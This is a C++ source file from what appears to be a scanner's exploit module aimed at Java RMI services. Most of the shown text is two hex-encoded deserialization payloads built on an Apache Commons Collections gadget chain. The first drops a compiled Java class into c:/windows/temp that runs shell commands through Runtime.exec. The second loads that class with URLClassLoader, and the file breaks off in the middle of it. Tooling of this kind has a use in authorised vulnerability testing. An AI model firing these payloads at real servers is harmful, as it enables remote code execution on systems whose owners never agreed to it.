#include "m_javarmi_exp.h"

extern mutex g_vServiceMutex;
extern vector<ServiceVuln> g_vServiceVuln;

m_javarmi_exp::m_javarmi_exp(PortService portService)
{
	this->portService = portService;
}


m_javarmi_exp::~m_javarmi_exp()
{
	
}

void m_javarmi_exp::checkServiceIsVuln(){
	if (!s_net_scanner::checkAliveReturn(this->portService.serviceIpAddr)){
		this->checkDeserialization();
	}
}

void m_javarmi_exp::checkDeserialization(){
	string bugName = "deserialization";
	SOCKET clientSocket;
	TcpClient tcpClient;
	
	string payload1 = R"(\x4a\x52\x4d\x49\x00\x02\x4b\x00\x0c\x31\x30\x2e\x31\x30\x31\x2e\x32\x32\x2e\x33\x39\x00\x00\x00\x00)";
	string payload2 = R"(\x50\xac\xed\x00\x05\x77\x22\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x44\x15\x4d\xc9\xd4\xe6\x3b\xdf\x74\x00\x05\x70\x77\x6e\x65\x64\x73\x7d\x00\x00\x00\x01\x00\x0f\x6a\x61\x76\x61\x2e\x72\x6d\x69\x2e\x52\x65\x6d\x6f\x74\x65\x70\x78\x72\x00\x17\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x50\x72\x6f\x78\x79\xe1\x27\xda\x20\xcc\x10\x43\xcb\x02\x00\x01\x4c\x00\x01\x68\x74\x00\x25\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x70\x78\x70\x73\x72\x00\x32\x73\x75\x6e\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x61\x6e\x6e\x6f\x74\x61\x74\x69\x6f\x6e\x2e\x41\x6e\x6e\x6f\x74\x61\x74\x69\x6f\x6e\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x55\xca\xf5\x0f\x15\xcb\x7e\xa5\x02\x00\x02\x4c\x00\x0c\x6d\x65\x6d\x62\x65\x72\x56\x61\x6c\x75\x65\x73\x74\x00\x0f\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4d\x61\x70\x3b\x4c\x00\x04\x74\x79\x70\x65\x74\x00\x11\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x70\x78\x70\x73\x72\x00\x31\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x6d\x61\x70\x2e\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x64\x4d\x61\x70\x61\x77\x3f\xe0\x5d\xf1\x5a\x70\x03\x00\x02\x4c\x00\x0e\x6b\x65\x79\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x74\x00\x2c\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x63\x6f\x6d\x6d\x6f\x6e\x73\x2f\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2f\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\x4c\x00\x10\x76\x61\x6c\x75\x65\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x71\x00\x7e\x00\x0a\x70\x78\x70\x70\x73\x72\x00\x3a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x43\x68\x61\x69\x6e\x65\x64\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x30\xc7\x97\xec\x28\x7a\x97\x04\x02\x00\x01\x5b\x00\x0d\x69\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x73\x74\x00\x2d\x5b\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x63\x6f\x6d\x6d\x6f\x6e\x73\x2f\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2f\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\x70\x78\x70\x75\x72\x00\x2d\x5b\x4c\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\xbd\x56\x2a\xf1\xd8\x34\x18\x99\x02\x00\x00\x70\x78\x70\x00\x00\x00\x04\x73\x72\x00\x3b\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x43\x6f\x6e\x73\x74\x61\x6e\x74\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x58\x76\x90\x11\x41\x02\xb1\x94\x02\x00\x01\x4c\x00\x09\x69\x43\x6f\x6e\x73\x74\x61\x6e\x74\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x70\x78\x70\x76\x72\x00\x18\x6a\x61\x76\x61\x2e\x69\x6f\x2e\x46\x69\x6c\x65\x4f\x75\x74\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x78\x70\x73\x72\x00\x3a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x49\x6e\x76\x6f\x6b\x65\x72\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x87\xe8\xff\x6b\x7b\x7c\xce\x38\x02\x00\x03\x5b\x00\x05\x69\x41\x72\x67\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x00\x0b\x69\x4d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x0b\x69\x50\x61\x72\x61\x6d\x54\x79\x70\x65\x73\x74\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x70\x78\x70\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x70\x78\x70\x00\x00\x00\x01\x75\x72\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x43\x6c\x61\x73\x73\x3b\xab\x16\xd7\xae\xcb\xcd\x5a\x99\x02\x00\x00\x70\x78\x70\x00\x00\x00\x01\x76\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\xa0\xf0\xa4\x38\x7a\x3b\xb3\x42\x02\x00\x00\x70\x78\x70\x74\x00\x0e\x67\x65\x74\x43\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x75\x71\x00\x7e\x00\x1d\x00\x00\x00\x01\x76\x71\x00\x7e\x00\x1d\x73\x71\x00\x7e\x00\x16\x75\x71\x00\x7e\x00\x1b\x00\x00\x00\x01\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x70\x78\x70\x00\x00\x00\x01\x74\x00\x23\x63\x3a\x2f\x77\x69\x6e\x64\x6f\x77\x73\x2f\x74\x65\x6d\x70\x2f\x45\x72\x72\x6f\x72\x42\x61\x73\x65\x45\x78\x65\x63\x2e\x63\x6c\x61\x73\x73\x74\x00\x0b\x6e\x65\x77\x49\x6e\x73\x74\x61\x6e\x63\x65\x75\x71\x00\x7e\x00\x1d\x00\x00\x00\x01\x76\x71\x00\x7e\x00\x1b\x73\x71\x00\x7e\x00\x16\x75\x71\x00\x7e\x00\x1b\x00\x00\x00\x01\x75\x72\x00\x02\x5b\x42\xac\xf3\x17\xf8\x06\x08\x54\xe0\x02\x00\x00\x70\x78\x70\x00\x00\x06\x24\xca\xfe\xba\xbe\x00\x00\x00\x32\x00\x65\x0a\x00\x20\x00\x35\x07\x00\x36\x07\x00\x37\x0a\x00\x03\x00\x38\x0a\x00\x02\x00\x39\x07\x00\x3a\x0a\x00\x06\x00\x35\x0a\x00\x02\x00\x3b\x0a\x00\x06\x00\x3c\x08\x00\x3d\x0a\x00\x06\x00\x3e\x0a\x00\x3f\x00\x40\x0a\x00\x3f\x00\x41\x0a\x00\x42\x00\x43\x0a\x00\x1f\x00\x44\x07\x00\x45\x07\x00\x46\x0a\x00\x11\x00\x35\x08\x00\x47\x0a\x00\x11\x00\x48\x0a\x00\x11\x00\x3e\x0a\x00\x10\x00\x49\x0a\x00\x10\x00\x3e\x08\x00\x4a\x0a\x00\x1a\x00\x4b\x07\x00\x4c\x0a\x00\x1a\x00\x49\x08\x00\x4d\x08\x00\x4e\x0a\x00\x1f\x00\x4f\x07\x00\x50\x07\x00\x51\x01\x00\x06\x3c\x69\x6e\x69\x74\x3e\x01\x00\x03\x28\x29\x56\x01\x00\x04\x43\x6f\x64\x65\x01\x00\x0f\x4c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x54\x61\x62\x6c\x65\x01\x00\x09\x72\x65\x61\x64\x42\x79\x74\x65\x73\x01\x00\x29\x28\x4c\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x01\x00\x0d\x53\x74\x61\x63\x6b\x4d\x61\x70\x54\x61\x62\x6c\x65\x07\x00\x36\x07\x00\x3a\x07\x00\x4c\x01\x00\x0a\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x73\x07\x00\x52\x01\x00\x07\x64\x6f\x5f\x65\x78\x65\x63\x01\x00\x15\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x56\x07\x00\x45\x07\x00\x45\x01\x00\x04\x6d\x61\x69\x6e\x01\x00\x16\x28\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x56\x01\x00\x0a\x53\x6f\x75\x72\x63\x65\x46\x69\x6c\x65\x01\x00\x12\x45\x72\x72\x6f\x72\x42\x61\x73\x65\x45\x78\x65\x63\x2e\x6a\x61\x76\x61\x0c\x00\x21\x00\x22\x01\x00\x16\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x42\x75\x66\x66\x65\x72\x65\x64\x52\x65\x61\x64\x65\x72\x01\x00\x19\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x52\x65\x61\x64\x65\x72\x0c\x00\x21\x00\x53\x0c\x00\x21\x00\x54\x01\x00\x16\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x42\x75\x66\x66\x65\x72\x0c\x00\x55\x00\x56\x0c\x00\x57\x00\x58\x01\x00\x01\x0a\x0c\x00\x59\x00\x56\x07\x00\x5a\x0c\x00\x5b\x00\x5c\x0c\x00\x5d\x00\x5e\x07\x00\x5f\x0c\x00\x60\x00\x61\x0c\x00\x25\x00\x26\x01\x00\x13\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x01\x00\x17\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x42\x75\x69\x6c\x64\x65\x72\x01\x00\x05\x38\x38\x38\x38\x3a\x0c\x00\x57\x00\x62\x0c\x00\x21\x00\x2e\x01\x00\x04\x38\x38\x38\x38\x0c\x00\x63\x00\x64\x01\x00\x10\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x01\x00\x02\x0d\x0a\x01\x00\x0a\x63\x6d\x64\x20\x2f\x63\x20\x64\x69\x72\x0c\x00\x2d\x00\x2e\x01\x00\x0d\x45\x72\x72\x6f\x72\x42\x61\x73\x65\x45\x78\x65\x63\x01\x00\x10\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x01\x00\x13\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x49\x4f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x01\x00\x18\x28\x4c\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x3b\x29\x56\x01\x00\x13\x28\x4c\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x52\x65\x61\x64\x65\x72\x3b\x29\x56\x01\x00\x08\x72\x65\x61\x64\x4c\x69\x6e\x65\x01\x00\x14\x28\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x01\x00\x06\x61\x70\x70\x65\x6e\x64\x01\x00\x2c\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x42\x75\x66\x66\x65\x72\x3b\x01\x00\x08\x74\x6f\x53\x74\x72\x69\x6e\x67\x01\x00\x11\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x52\x75\x6e\x74\x69\x6d\x65\x01\x00\x0a\x67\x65\x74\x52\x75\x6e\x74\x69\x6d\x65\x01\x00\x15\x28\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x52\x75\x6e\x74\x69\x6d\x65\x3b\x01\x00\x04\x65\x78\x65\x63\x01\x00\x27\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x50\x72\x6f\x63\x65\x73\x73\x3b\x01\x00\x11\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x50\x72\x6f\x63\x65\x73\x73\x01\x00\x0e\x67\x65\x74\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x01\x00\x17\x28\x29\x4c\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x3b\x01\x00\x2d\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x42\x75\x69\x6c\x64\x65\x72\x3b\x01\x00\x07\x69\x6e\x64\x65\x78\x4f\x66\x01\x00\x15\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x49\x00\x21\x00\x1f\x00\x20\x00\x00\x00\x00\x00\x04\x00\x01\x00\x21\x00\x22\x00\x01\x00\x23\x00\x00\x00\x1d\x00\x01\x00\x01\x00\x00\x00\x05\x2a\xb7\x00\x01\xb1\x00\x00\x00\x01\x00\x24\x00\x00\x00\x06\x00\x01\x00\x00\x00\x03\x00\x09\x00\x25\x00\x26\x00\x02\x00\x23\x00\x00\x00\x7b\x00\x05\x00\x05\x00\x00\x00\x38\xbb\x00\x02\x59\xbb\x00\x03\x59\x2a\xb7\x00\x04\xb7\x00\x05\x4c\xbb\x00\x06\x59\xb7\x00\x07\x4d\x2b\xb6\x00\x08\x59\x4e\xc6\x00\x11\x2c\x2d\xb6\x00\x09\x12\x0a\xb6\x00\x09\x57\xa7\xff\xec\x2c\xb6\x00\x0b\x3a\x04\x19\x04\xb0\x00\x00\x00\x02\x00\x24\x00\x00\x00\x1a\x00\x06\x00\x00\x00\x06\x00\x10\x00\x07\x00\x18\x00\x09\x00\x21\x00\x0a\x00\x2f\x00\x0d\x00\x35\x00\x0e\x00\x27\x00\x00\x00\x11\x00\x02\xfd\x00\x18\x07\x00\x28\x07\x00\x29\xfc\x00\x16\x07\x00\x2a\x00\x2b\x00\x00\x00\x04\x00\x01\x00\x2c\x00\x09\x00\x2d\x00\x2e\x00\x02\x00\x23\x00\x00\x00\xaf\x00\x06\x00\x03\x00\x00\x00\x65\xb8\x00\x0c\x2a\xb6\x00\x0d\x4c\x2b\xb6\x00\x0e\xb8\x00\x0f\x4d\xbb\x00\x10\x59\xbb\x00\x11\x59\xb7\x00\x12\x12\x13\xb6\x00\x14\x2c\xb6\x00\x14\xb6\x00\x15\xb7\x00\x16\xbf\x4c\x2b\xb6\x00\x17\x12\x18\xb6\x00\x19\x02\xa4\x00\x05\x2b\xbf\xbb\x00\x10\x59\xbb\x00\x11\x59\xb7\x00\x12\x12\x13\xb6\x00\x14\xbb\x00\x1a\x59\x2b\xb6\x00\x17\xb7\x00\x1b\xb6\x00\x14\x12\x1c\xb6\x00\x14\xb6\x00\x15\xb7\x00\x16\xbf\x00\x01\x00\x00\x00\x2b\x00\x2b\x00\x10\x00\x02\x00\x24\x00\x00\x00\x1e\x00\x07\x00\x00\x00\x13\x00\x08\x00\x14\x00\x10\x00\x15\x00\x2b\x00\x18\x00\x2c\x00\x1a\x00\x39\x00\x1c\x00\x3b\x00\x1f\x00\x27\x00\x00\x00\x0c\x00\x02\x6b\x07\x00\x2f\xfc\x00\x0f\x07\x00\x30\x00\x2b\x00\x00\x00\x04\x00\x01\x00\x10\x00\x09\x00\x31\x00\x32\x00\x02\x00\x23\x00\x00\x00\x22\x00\x01\x00\x01\x00\x00\x00\x06\x12\x1d\xb8\x00\x1e\xb1\x00\x00\x00\x01\x00\x24\x00\x00\x00\x0a\x00\x02\x00\x00\x00\x26\x00\x05\x00\x27\x00\x2b\x00\x00\x00\x04\x00\x01\x00\x10\x00\x01\x00\x33\x00\x00\x00\x02\x00\x34\x74\x00\x05\x77\x72\x69\x74\x65\x75\x71\x00\x7e\x00\x1d\x00\x00\x00\x01\x76\x71\x00\x7e\x00\x2e\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x70\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x01\x74\x00\x05\x76\x61\x6c\x75\x65\x71\x00\x7e\x00\x35\x78\x78\x76\x72\x00\x1b\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x61\x6e\x6e\x6f\x74\x61\x74\x69\x6f\x6e\x2e\x54\x61\x72\x67\x65\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x78\x70)";
	string payload3 = R"(\x50\xac\xed\x00\x05\x77\x22\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x44\x15\x4d\xc9\xd4\xe6\x3b\xdf\x74\x00\x05\x70\x77\x6e\x65\x64\x73\x7d\x00\x00\x00\x01\x00\x0f\x6a\x61\x76\x61\x2e\x72\x6d\x69\x2e\x52\x65\x6d\x6f\x74\x65\x70\x78\x72\x00\x17\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x50\x72\x6f\x78\x79\xe1\x27\xda\x20\xcc\x10\x43\xcb\x02\x00\x01\x4c\x00\x01\x68\x74\x00\x25\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x70\x78\x70\x73\x72\x00\x32\x73\x75\x6e\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x61\x6e\x6e\x6f\x74\x61\x74\x69\x6f\x6e\x2e\x41\x6e\x6e\x6f\x74\x61\x74\x69\x6f\x6e\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x55\xca\xf5\x0f\x15\xcb\x7e\xa5\x02\x00\x02\x4c\x00\x0c\x6d\x65\x6d\x62\x65\x72\x56\x61\x6c\x75\x65\x73\x74\x00\x0f\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4d\x61\x70\x3b\x4c\x00\x04\x74\x79\x70\x65\x74\x00\x11\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x70\x78\x70\x73\x72\x00\x31\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x6d\x61\x70\x2e\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x64\x4d\x61\x70\x61\x77\x3f\xe0\x5d\xf1\x5a\x70\x03\x00\x02\x4c\x00\x0e\x6b\x65\x79\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x74\x00\x2c\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x63\x6f\x6d\x6d\x6f\x6e\x73\x2f\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2f\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\x4c\x00\x10\x76\x61\x6c\x75\x65\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x71\x00\x7e\x00\x0a\x70\x78\x70\x70\x73\x72\x00\x3a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x43\x68\x61\x69\x6e\x65\x64\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x30\xc7\x97\xec\x28\x7a\x97\x04\x02\x00\x01\x5b\x00\x0d\x69\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x73\x74\x00\x2d\x5b\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x63\x6f\x6d\x6d\x6f\x6e\x73\x2f\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2f\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\x70\x78\x70\x75\x72\x00\x2d\x5b\x4c\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\xbd\x56\x2a\xf1\xd8\x34\x18\x99\x02\x00\x00\x70\x78\x70\x00\x00\x00\x06\x73\x72\x00\x3b\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x43\x6f\x6e\x73\x74\x61\x6e\x74\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x58\x76\x90\x11\x41\x02\xb1\x94\x02\x00\x01\x4c\x00\x09\x69\x43\x6f\x6e\x73\x74\x61\x6e\x74\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x70\x78\x70\x76\x72\x00\x17\x6a\x61\x76\x61\x2e\x6e\x65\x74\x2e\x55\x52\x4c\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x78\x70\x73\x72\x00\x3a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x49\x6e\x76\x6f\x6b\x65\x72\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x87\xe8\xff\x6b\x7b\x7c\xce\x38\x02\x00\x03\x5b\x00\x05\x69\x41\x72\x67\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x00\x0b\x69\x4d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x0b\x69\x50\x61\x72\x61\x6d\x54\x79\x70\x65\x73\x74\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x70\x78\x70\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x70\x78\x70\x00\x00\x00\x01\x75\x72\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x43\x6c\x61\x73\x73\x3b\xab\x16\xd7\xae\xcb\xcd\x5a\x99\x02\x00\x00\x70\x78\x70\x00\x00\x00\x01\x76\x72\x00\x0f\x5b\x4c\x6a\x61\x76\x61\x2e\x6e\x65\x74\x2e\x55\x52\x4c\x3b\x52\x51\xfd\x24\xc5\x1b\x68\xcd\x02\x00\x00\x70\x78\x70\x74\x00\x0e\x67\x65\x74\x43\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x75\x71\x00\x7e\x00\x1d\x00\x00\x00\x01\x76\x71\x00\x7e\x00\x1d\x73\x71\x00\x7e\x00\x16\x75\x71\x00\x7e\x00\x1b\x00\x00\x00\x01\x75\x71\x00\x7e\x00\x1b\x00\x00\x00\x01\x75\x71\x00\x7e\x00\x1f\x00\x00\x00\x01\x73\x72\x00\x0c\x6a\x61\x76\x61\x2e\x6e\x65\x74\x2e\x55\x52\x4c\x96\x25\x37\x36\x1a\xfc\xe4\x72\x03\x00\x07\x49\x00\x08\x68\x61\x73\x68\x43\x6f\x64\x65\x49\x00\x04\x70\x6f\x72\x74\x4c\x00\x09\x61\x75\x74\x68\x6f\x72\x69\x74\x79\x71\x00\x7e\x00\x18\x4c\x00\x04\x66\x69\x6c\x65\x71\x00\x7e\x00\x18\x4c\x00\x04\x68\x6f\x73\x74\x71\x00\x7e\x00\x18\x4c\x00\x08\x70\x72\x6f\x74\x6f\x63\x6f\x6c\x71\x00\x7e\x00\x18\x4c\x00\x03\x72\x65\x66\x71\x00\x7e\x00\x18\x70\x78\x70\xff\xff\xff\xff\xff\xff\xff\xff\x70\x74\x00\x11\x2f\x63\x3a\x2f\x77\x69\x6e\x64\x6f\x77\x73\x2f\x74\x65\x6d\x70\x2f\x74\x00\x00\x74\x00\x04\x66\x69\x6c\x65\x70\x78\x74\x00\x0b\x6e\x65\x77\x49\x6e\x73\x74\x61\x6e\x63\x65\x75\x71\x00\x7e\x00\x1d\x00\x00\x00\x01\x76\x71\x00\x7e\x00\x1b\x73\x71\x00\x7e\x00\x16\x75\x71\x00\x7e\x00\x1b\x00\x00\x00\x01\x74\x00\x0d\x45\x72\x72\x6f\x72\x42\x61\x73\x65\x45\x78\x65\x63\x74\x00\x09\x6c\x6f\x61\x64\x43\x6c\x61\x73\x73\x75\x71\x00\x7e\x00\x1d\x00\x00\x00\x01\x76\x72\x00\x10\x6a\x6